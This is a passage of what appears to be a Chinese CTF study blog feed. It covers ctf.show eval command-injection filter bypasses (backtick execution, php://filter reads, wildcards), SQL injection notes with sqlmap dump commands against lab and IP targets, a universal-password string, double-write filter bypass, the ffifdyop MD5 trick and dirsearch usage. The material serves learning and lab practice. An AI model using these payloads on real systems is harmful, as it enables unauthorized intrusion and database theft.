class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment"># flag in config.php</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;config.php&quot;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/system|exec|highlight|cat|\(|\.|\;|file|php|config/i&quot;</span>,<span class="hljs-variable">$c</span>))&#123;<br>                <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;cmd error&quot;</span>);<br>        &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>发现这一次有点离谱，居然把小括号给引用了，那么有一些函数就用不了了，不过我们要记住php中&#96;&#96;直接代表指令</p></blockquote><blockquote><p>那么我们就不用（）的函数，我们使用?c&#x3D;echo `tac con*`?&gt;</p></blockquote><blockquote><p>也可以直接echo找到flag</p></blockquote><blockquote><p>当然还可以用伪协议</p><p>涉及到一个php的代码结构，<?php $_GET[a];?>…..②payload为：?c&#x3D;include $_GET[a]?&gt;，等同于<?php include $_GET[a]?>，php的最后一行代码可以省去分号…..③include函数包含文件，且题目是对参数c正则过滤，因此GET型传参a可以绕过，从而执行我们的伪协议文件命令，读取config.php文件：php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;.&#x2F;config.php④因此连起来构造的payload为：</p></blockquote><blockquote><p>也可以&#x2F;?c&#x3D;echo <code>$_GET[a]</code>​?&gt;&amp;a&#x3D;cat config.php 让其echo一个get请求，?&gt;闭合，请求内容为cat config.php</p></blockquote><p>‍</p><h1 id="第六题"><a href="#第六题" class="headerlink" title="第六题"></a>第六题</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment"># flag in config.php</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;config.php&quot;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/system|\\*|\?|\&lt;|\&gt;|\=|exec|highlight|cat|\(|\.|file|php|config/i&quot;</span>,<span class="hljs-variable">$c</span>))&#123;<br>                <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;cmd error&quot;</span>);<br>        &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>新增了*，？，&lt;&gt;，&#x3D;的过滤，这样就不能用?&gt;结尾了，</p></blockquote><blockquote><p>但是还可以可以用get和post,?c&#x3D;echo`$_GET[1]`;&amp;1&#x3D;tac “config.php”</p></blockquote><blockquote><p>?c&#x3D;echo <code>$_POST[a]</code>​; BP 截断，修改为POST, 增加参数 a&#x3D; cat config.php</p></blockquote><blockquote><p>只禁用了*和?常用通配符，还可以使用其他通配符[c1-c2],[!c1-c2],[list]等 payload：?c&#x3D;echo <code>tac confi[g][!0-9]ph[p]</code>​;</p></blockquote><blockquote><p>?a&#x3D;cat config.php&amp;c&#x3D;echo<code>$_REQUEST[a]</code>​; ?a&#x3D;cat config.php&amp;c&#x3D;echo<code>$_GET[a]</code>​; 解析：php语言中，使用get、post传参，参数保存在超级变量$_REQUEST[a]、$_POST[a]、$_REQUEST[a]中。我们向REQUEST[a]传入文件名（因为如果写入c，会被过滤），然后向c传入执行_REQUEST[a]的代码。 另外，我们也可以通过burp抓包，以post方法将变量传入到a；通过get方法，向c传入执行代码。</p></blockquote><p>‍</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>绕过</category>
      
    </categories>
    
    
    <tags>
      
      <tag>指令绕过</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQL注入</title>
    <link href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/"/>
    <url>/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p>python sqlmap.py -u <a href="http://127.0.0.1/sqli-labs/sqli-labs/Less-1/?id=1">http://127.0.0.1/sqli-labs/sqli-labs/Less-1/?id=1</a></p><p>python sqlmap.py -u <a href="http://127.0.0.1/sqli-labs/sqli-labs/Less-1/?id=1">http://127.0.0.1/sqli-labs/sqli-labs/Less-1/?id=1</a> –dbs</p><p>python sqlmap.py -u <a href="http://127.0.0.1/sqli-labs/sqli-labs/Less-1/?id=1">http://127.0.0.1/sqli-labs/sqli-labs/Less-1/?id=1</a> -D security –tables</p><p>python sqlmap.py -u <a href="http://127.0.0.1/sqli-labs/sqli-labs/Less-1/?id=1">http://127.0.0.1/sqli-labs/sqli-labs/Less-1/?id=1</a> -D security -T users –dump-all</p><p>清除缓存</p><p>python sqlmap.py -u <a href="http://127.0.0.1/sqli-labs/sqli-labs/Less-1/?id=1">http://127.0.0.1/sqli-labs/sqli-labs/Less-1/?id=1</a> –purge</p><p>可以用获取cookie得到现在已经登录</p><p>–columns 可以获得指定数据库列&#x2F;表项</p><h1 id="可能需要进阶学习"><a href="#可能需要进阶学习" class="headerlink" title="可能需要进阶学习"></a>可能需要进阶学习</h1><p><a href="https://zh.wikipedia.org/zh-cn/SQL%E6%B3%A8%E5%85%A5">SQL注入 - 维基百科，自由的百科全书 (wikipedia.org)</a></p><p><a href="http://www.phpmyadmin.net数据库图形化界面/">www.phpmyadmin.net数据库图形化界面</a>  SQLyog Ultimate 64</p><blockquote><p><strong>information_schema</strong> 库:是信息数据库，其中保存着关于MSQL服务器所维护的所有其他数据库的信息,  比如数据库名，数据库表，表字段的数据类型与访问权限等。Web渗透过程中用途很大。（<strong>摘要</strong>）<br><strong>SCHEMATA</strong> 表 : 提供了当前MySQL实例中所有的数据库信息，<span data-type="text" style="color: var(--b3-font-color12);">show databases</span> 结果取之此表<br><strong>TABLES</strong> 表 : 提供了关于数据中表的信息<br><strong>COLUMNS</strong> 表 : 提供了表中的列信心，详细描述了某张表的所有列已经每个列的信息。<br><strong>mysql</strong> 库 : MySQL的核心数据库，主要负责存储数据库的用户、权限设置、关键字等mysql自己需要使用的<br>控制和管理信息。<br><strong>performance_schema</strong> 库 : 内存数据库，数据放在内存中直接操作的数据库。相对于磁盘，内存的数据读写<br>速度要高出几个数量级，将数据保存在内存中相 比从磁盘上访问能够极大地提高应用的性能<br><strong>sys</strong> 库 : 通过这个数据库数据库，可以査询谁使用了最多的资源 基于IP或是用户。哪张表被访问过最多等等<br>信息。</p></blockquote><p><a href="https://blog.csdn.net/qq_45173404/article/details/115712758">MySQL详细学习教程（建议收藏）-CSDN博客</a></p><p><strong>用  1‘ order by 1# 1‘ order by 2#等进行判断数据库有几列&#x2F;字段</strong></p><h2 id="联合查询其他信息"><a href="#联合查询其他信息" class="headerlink" title="联合查询其他信息"></a>联合查询其他信息</h2><p><strong>union select [sql1][sql2]</strong></p><p>输入 1’ union select user(),database()#</p><p>用户输入sql语句，执行了MySQL内置函数user()和database()</p><p>‍</p><blockquote><p>system_user()管理员</p><p>user()用户</p><p>current_user()</p><p>database()库</p><p>version()版本</p><p>@@datadirmysql安装路径</p><p>@@version_compile_os当前的操作系统</p></blockquote><p>‍</p><p>如果很多语句被过滤掉，我们可以尝试双写绕过</p><p>​<code>username=1’ununionion seselectlect 1#&amp;password=1</code>​</p><p>‍</p><h2 id="SQL注入的产生原因"><a href="#SQL注入的产生原因" class="headerlink" title="SQL注入的产生原因:"></a>SQL注入的产生原因:</h2><p>当Web应用向后台数据库传递SQL语句进行数据库操作时，如果对用户输入的参数没有经过<span data-type="text" style="color: var(--b3-font-color8);">严格的过滤处理</span>，那么攻击者就可以构造特殊的SQL语句，直接输入数据库引擎执行，获取或修改数据库中的数据。</p><h2 id="本质：-把用户输入的数据当成是代码来执行"><a href="#本质：-把用户输入的数据当成是代码来执行" class="headerlink" title="本质： 把用户输入的数据当成是代码来执行"></a>本质： 把用户输入的数据当成是代码来执行</h2><p>两个关键点： 预编译可以防备SQL注入（所有漏洞都是有条件的！！！）</p><p>1、用户能够控制输入的内容；</p><p>2、数据库能够执行用户输入的内容。</p><h2 id="SQl注入的危害："><a href="#SQl注入的危害：" class="headerlink" title="SQl注入的危害："></a>SQl注入的危害：</h2><p>盗取网站的敏感信息；</p><p>绕过网站后台的认证；</p><pre><code class="hljs">  万能密码： &#39; or &#39;1&#39; = &#39; 1&#39; #</code></pre><p>limit 0,1  <kbd>0代表先从第几行开始回显，1代表显示几行</kbd>​</p><p>后台登陆的SQL语句： select * from users where username&#x3D; ‘$user’ and password&#x3D;’$pass’</p><p>‍</p><h2 id="SQL注入的漏洞"><a href="#SQL注入的漏洞" class="headerlink" title="SQL注入的漏洞"></a>SQL注入的漏洞</h2><p>根据注入位置分类： GET类、POST类、Head头注入</p><p>根据反馈结果分类： 有回显（显错注入）、无回显（盲注）</p><p>根据数据类型分类：</p><pre><code class="hljs">数字型： 输入的参数为整型，如id、年龄、页码等（&lt;span data-type=&quot;text&quot; style=&quot;color: var(--b3-font-color8);&quot;&gt;SQL注入中数字型没有小数&lt;/span&gt;）字符型： 输入的参数为字符串</code></pre><p>数字型与字符型最大的区别在于：数字型不需要闭合，而字符型一般需要<span data-type="text" style="color: var(--b3-font-color8);">闭合</span></p><p>‍</p><p>‍</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>注入漏洞</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SQL注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>dirsearch</title>
    <link href="/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/dirsearch/"/>
    <url>/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/dirsearch/</url>
    
    <content type="html"><![CDATA[<h1 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a>dirsearch</h1><p>windows下要下载dirsearch包，然后用python解析使用，所以我选择用kali</p><h3 id="常用参数说明"><a href="#常用参数说明" class="headerlink" title="常用参数说明"></a>常用参数说明</h3><table><thead><tr><th>参数</th><th>说明</th><th>示例</th></tr></thead><tbody><tr><td>​<code>-u</code>​&#x2F;<code>--url</code>​</td><td>指定目标URL</td><td>​<code>-u http://example.com</code>​</td></tr><tr><td>​<code>-e</code>​&#x2F;<code>--extensions</code>​</td><td>指定文件扩展名</td><td>​<code>-e php,html,js</code>​</td></tr><tr><td>​<code>-w</code>​&#x2F;<code>--wordlist</code>​</td><td>使用自定义字典</td><td>​<code>-w /path/to/wordlist.txt</code>​</td></tr><tr><td>​<code>-r</code>​&#x2F;<code>--recursive</code>​</td><td>递归扫描</td><td>​<code>-r</code>​</td></tr><tr><td>​<code>--threads</code>​</td><td>设置线程数</td><td>​<code>--threads 50</code>​</td></tr><tr><td>​<code>--timeout</code>​</td><td>设置超时时间</td><td>​<code>--timeout 5</code>​</td></tr><tr><td>​<code>--random-agent</code>​</td><td>使用随机User-Agent</td><td>​<code>--random-agent</code>​</td></tr><tr><td>​<code>--proxy</code>​</td><td>使用代理</td><td>​<code>--proxy http://127.0.0.1:8080</code>​</td></tr></tbody></table><p>‍</p><h2 id="高级用法"><a href="#高级用法" class="headerlink" title="高级用法"></a>高级用法</h2><h3 id="1-使用扩展名过滤"><a href="#1-使用扩展名过滤" class="headerlink" title="1. 使用扩展名过滤"></a>1. 使用扩展名过滤</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 dirsearch.py -u http://example.com -e php,html,js<br></code></pre></td></tr></table></figure><h3 id="2-使用自定义字典"><a href="#2-使用自定义字典" class="headerlink" title="2. 使用自定义字典"></a>2. 使用自定义字典</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 dirsearch.py -u http://example.com -w /path/to/custom_wordlist.txt<br></code></pre></td></tr></table></figure><h3 id="3-递归扫描"><a href="#3-递归扫描" class="headerlink" title="3. 递归扫描"></a>3. 递归扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 dirsearch.py -u http://example.com -r<br></code></pre></td></tr></table></figure><h3 id="4-排除特定状态码"><a href="#4-排除特定状态码" class="headerlink" title="4. 排除特定状态码"></a>4. 排除特定状态码</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 dirsearch.py -u http://example.com --exclude-status 403,404<br></code></pre></td></tr></table></figure><h3 id="5-保存扫描结果"><a href="#5-保存扫描结果" class="headerlink" title="5. 保存扫描结果"></a>5. 保存扫描结果</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python3</span> dirsearch.<span class="hljs-keyword">py</span> -<span class="hljs-keyword">u</span> http://example.<span class="hljs-keyword">com</span> -<span class="hljs-keyword">o</span> /path/<span class="hljs-keyword">to</span>/report.txt<br></code></pre></td></tr></table></figure><p>‍</p><h2 id="实用技巧"><a href="#实用技巧" class="headerlink" title="实用技巧"></a>实用技巧</h2><ol><li><strong>降低扫描速度</strong>：添加 <code>--delay=1</code>​ 参数，设置每次请求间隔1秒</li><li><strong>只显示特定状态码</strong>：使用 <code>--status-codes 200,301,302</code>​</li><li><strong>强制扫描</strong>：使用 <code>--force</code>​ 参数，即使目标返回403也继续扫描</li><li><strong>HTTP方法</strong>：使用 <code>-m GET,POST</code>​ 指定HTTP方法</li></ol>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>工具使用</category>
      
    </categories>
    
    
    <tags>
      
      <tag>dirsearch</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>神奇的MD5</title>
    <link href="/2025/05/20/Web/%E7%BB%95%E8%BF%87/%E7%A5%9E%E5%A5%87%E7%9A%84MD5/"/>
    <url>/2025/05/20/Web/%E7%BB%95%E8%BF%87/%E7%A5%9E%E5%A5%87%E7%9A%84MD5/</url>
    
    <content type="html"><![CDATA[<h1 id="神奇的MD5"><a href="#神奇的MD5" class="headerlink" title="神奇的MD5"></a>神奇的MD5</h1><h4 id="奇妙的字符串"><a href="#奇妙的字符串" class="headerlink" title="奇妙的字符串"></a>奇妙的字符串</h4><p>一个是MD5加密后弱比较等于自身，这个字符串是 0e215962017 ：</p><p>另一个是 MD5 加密后变成万能密码，这个字符串是 ffifdyop ：</p><blockquote><p>经过md5加密后：276f722736c95d99e921722cf9ed621c<br>再转换为字符串：‘or’6&lt;乱码&gt; 即 ‘or’66�]��!r,��b<br>用途：<br>select * from admin where password=’‘or’6&lt;乱码&gt;’<br>就相当于select * from admin where password=’’or 1 实现sql注入</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>;;) &#123; <br> <span class="hljs-keyword">for</span> (<span class="hljs-variable">$c</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$c</span> &lt; <span class="hljs-number">1000000</span>; <span class="hljs-variable">$c</span>++, <span class="hljs-variable">$i</span>++)<br>  <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$i</span>, <span class="hljs-literal">true</span>), <span class="hljs-string">&#x27;\&#x27;or\&#x27;&#x27;</span>) !== <span class="hljs-literal">false</span>)<br>   <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\nmd5(<span class="hljs-subst">$i</span>) = &quot;</span> . <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$i</span>, <span class="hljs-literal">true</span>) . <span class="hljs-string">&quot;\n&quot;</span>;<br> <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;.&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>‍</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>绕过</category>
      
    </categories>
    
    
    <tags>
      
      <tag>神奇的MD5</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>绕过</title>
    <link href="/2025/05/20/Web/%E7%BB%95%E8%BF%87/%E7%BB%95%E8%BF%87/"/>
    <url>/2025/05/20/Web/%E7%BB%95%E8%BF%87/%E7%BB%95%E8%BF%87/</url>
    
    <content type="html"><![CDATA[<h1 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;html&gt;<br>&lt;head&gt;<br>    &lt;title&gt;ctf.show萌新计划web1&lt;/title&gt;<br>    &lt;meta charset=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br><span class="hljs-meta">&lt;?php</span><span class="hljs-comment"># 包含数据库连接文件</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;config.php&quot;</span>);<span class="hljs-comment"># 判断get提交的参数id是否存在</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$id</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\&#x27;|\&quot;|or|\||\-|\\\|\/|\\*|\&lt;|\&gt;|\^|\!|\~|x|hex|\(|\)|\+|select/i&quot;</span>,<span class="hljs-variable">$id</span>))&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;id error&quot;</span>);<br>    &#125;<span class="hljs-comment"># 判断id的值是否大于999</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$id</span>) &gt; <span class="hljs-number">999</span>)&#123;<span class="hljs-comment"># id 大于 999 直接退出并返回错误</span><br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;id error&quot;</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-comment"># id 小于 999 拼接sql语句</span><br>        <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select * from article where id = <span class="hljs-subst">$id</span> order by id limit 1 &quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;执行的sql为：<span class="hljs-subst">$sql</span>&lt;br&gt;&quot;</span>;<span class="hljs-comment"># 执行sql 语句</span><br>        <span class="hljs-variable">$result</span> = <span class="hljs-variable">$conn</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-variable">$sql</span>);<span class="hljs-comment"># 判断有没有查询结果</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$result</span>-&gt;num_rows &gt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-comment"># 如果有结果，获取结果对象的值$row</span><br>            <span class="hljs-keyword">while</span>(<span class="hljs-variable">$row</span> = <span class="hljs-variable">$result</span>-&gt;<span class="hljs-title function_ invoke__">fetch_assoc</span>()) &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;id: &quot;</span> . <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;id&quot;</span>]. <span class="hljs-string">&quot; - title: &quot;</span> . <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;title&quot;</span>]. <span class="hljs-string">&quot; &lt;br&gt;&lt;hr&gt;&quot;</span> . <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;content&quot;</span>]. <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>            &#125;<br>        &#125;<span class="hljs-comment"># 关闭数据库连接</span><br>        <span class="hljs-variable">$conn</span>-&gt;<span class="hljs-title function_ invoke__">close</span>();<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br>&lt;/body&gt;<br>&lt;!-- flag in id = <span class="hljs-number">1000</span> --&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><blockquote><p>查看题目给我们的源码，发现这是用的intval函数，我们看这个禁用的名单，发现还是有很多没有禁用的</p></blockquote><blockquote><p>方法一：?id&#x3D;1 || id&#x3D;1000 那这样sql语句就会变成select * from article where id &#x3D; 1 || id&#x3D;1000 order by id limit 1，以至于满足查询条件，而且查询到1000的信息</p></blockquote><blockquote><p>方法二：~取反符号，双重取反~~1000</p></blockquote><blockquote><p>方法三：二进制转换，<code>id=0b1111101000</code>​</p></blockquote><blockquote><p>方法四：采用单引号，让判断为字符id&#x3D;’1000’</p></blockquote><blockquote><p>方法五：采用异或，0000%5E1000</p></blockquote><blockquote><p>方法六：采用恒定真值，id %23</p></blockquote><blockquote><p>方法七：采用sql中除号的另外一种写法绕过（div）?id&#x3D;500 div 0.5</p></blockquote><p>‍</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>绕过</category>
      
    </categories>
    
    
    <tags>
      
      <tag>绕过</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sqlmap通关sqli-labs</title>
    <link href="/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/sqlmap/sqlmap%E9%80%9A%E5%85%B3sqli-labs/"/>
    <url>/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/sqlmap/sqlmap%E9%80%9A%E5%85%B3sqli-labs/</url>
    
    <content type="html"><![CDATA[<h1 id="sqlmap通关sqli-labs"><a href="#sqlmap通关sqli-labs" class="headerlink" title="sqlmap通关sqli-labs"></a>sqlmap通关sqli-labs</h1><h2 id="基础注入"><a href="#基础注入" class="headerlink" title="基础注入"></a>基础注入</h2><blockquote><p>&#x3D;&#x3D;获取用户：&#x3D;&#x3D;​<code>root@localhost</code>​</p><p>​<code>sqlmap -u http://ac5ceb14-e90d-472a-be02-3ad160f2b6ee.node5.buuoj.cn/Less-2/?id=1 --current-user</code>​</p></blockquote><blockquote><p>&#x3D;&#x3D;获取当前数据库：&#x3D;&#x3D;</p><p>​<code>sqlmap -u http://59.63.200.79:8003/?id=1 --current-db</code>​</p></blockquote><blockquote><p>&#x3D;&#x3D;获取数据库：&#x3D;&#x3D;​<code>ctftraining</code>​</p><p>​<code>sqlmap -u http://ac5ceb14-e90d-472a-be02-3ad160f2b6ee.node5.buuoj.cn/Less-2/?id=1 --dbs</code>​</p></blockquote><blockquote><p>&#x3D;&#x3D;获取表：&#x3D;&#x3D;​<code>flag、news、users</code></p><p>​<code>sqlmap -u http://ac5ceb14-e90d-472a-be02-3ad160f2b6ee.node5.buuoj.cn/Less-2/?id=1 -D ctftraining --tables</code>​</p></blockquote><blockquote><p>&#x3D;&#x3D;获取所有字段&#x3D;&#x3D;获取admin表里的字段<br>​<code>sqlmap -u http://59.63.200.79:8003/?id=1 -D maoshe -T admin --columns</code>​</p></blockquote><blockquote><p>&#x3D;&#x3D;获取字段值&#x3D;&#x3D;<br>​<code>sqlmap -u http://59.63.200.79:8003/?id=1 -D maoshe -T admin -C Id,password,username --dump</code>​</p></blockquote><blockquote><p>&#x3D;&#x3D;获取flag：&#x3D;&#x3D;</p><p>​<code>sqlmap -u http://ac5ceb14-e90d-472a-be02-3ad160f2b6ee.node5.buuoj.cn/Less-2/?id=1 -D ctftraining -T flag --dump</code>​</p></blockquote><p>‍</p><h2 id="POST型注入"><a href="#POST型注入" class="headerlink" title="POST型注入"></a>POST型注入</h2><blockquote><p>使用BP抓包&#x3D;&#x3D;获取post报文&#x3D;&#x3D;，保存在&#x3D;&#x3D;txt文件&#x3D;&#x3D;里、&#x3D;&#x3D;-r代表文档&#x3D;&#x3D;，文档内容就是你的&#x3D;&#x3D;post报文&#x3D;&#x3D; –batch 自动选择yes、<br>获取到我们熟知的关键数据库：ctftraining</p><p>​<code>sqlmap -r post_sqlmap.txt --batch -dbs</code>​</p></blockquote><blockquote><p>&#x3D;&#x3D;获取表：&#x3D;&#x3D;​<code>flag、news、users</code>​</p><p>​<code>sqlmap -r 1.txt --batch -D ctftraining --tables</code>​</p></blockquote><blockquote><p>&#x3D;&#x3D;获取flag：&#x3D;&#x3D;</p><p>​<code>sqlmap -r 1.txt --batch -D ctftraining -T flag --dump</code>​</p></blockquote><p>‍</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>工具使用</category>
      
      <category>sqlmap</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sqlmap通关sqli-labs</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>绕过WAF</title>
    <link href="/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/sqlmap/%E7%BB%95%E8%BF%87WAF/"/>
    <url>/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/sqlmap/%E7%BB%95%E8%BF%87WAF/</url>
    
    <content type="html"><![CDATA[<h1 id="绕过WAF"><a href="#绕过WAF" class="headerlink" title="绕过WAF"></a>绕过WAF</h1><h1 id="实战演示"><a href="#实战演示" class="headerlink" title="实战演示"></a>实战演示</h1><p>通过前期的信息收集发现存在注入的页面如下：</p><p><img src="/.com//image-20250519105437-67lcu06.png" alt="image">​</p><p>直接使用sqlmap跑发现出现如下错误：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">python2 sqlmap.py -u <span class="hljs-string">&quot;http://xxxx?&amp;daxxtae=null&amp;parame=xxxxxx&quot;</span> --batch --delay=1 --random-agent<br>        ___<br>       __H__<br> ___ ___[<span class="hljs-string">&quot;]_____ ___ ___  &#123;1.5.4.7#dev&#125;</span><br><span class="hljs-string">|_ -| . [)]     | .&#x27;| . |</span><br><span class="hljs-string">|___|_  [&quot;</span>]_|_|_|__,|  _|<br>      |_|V...       |_|   http://sqlmap.org<br><br>[!] legal disclaimer: Usage of sqlmap <span class="hljs-keyword">for</span> attacking targets without prior mutual consent is illegal. It is the end user<span class="hljs-string">&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span><br><span class="hljs-string"></span><br><span class="hljs-string">[*] starting @ 10:12:10 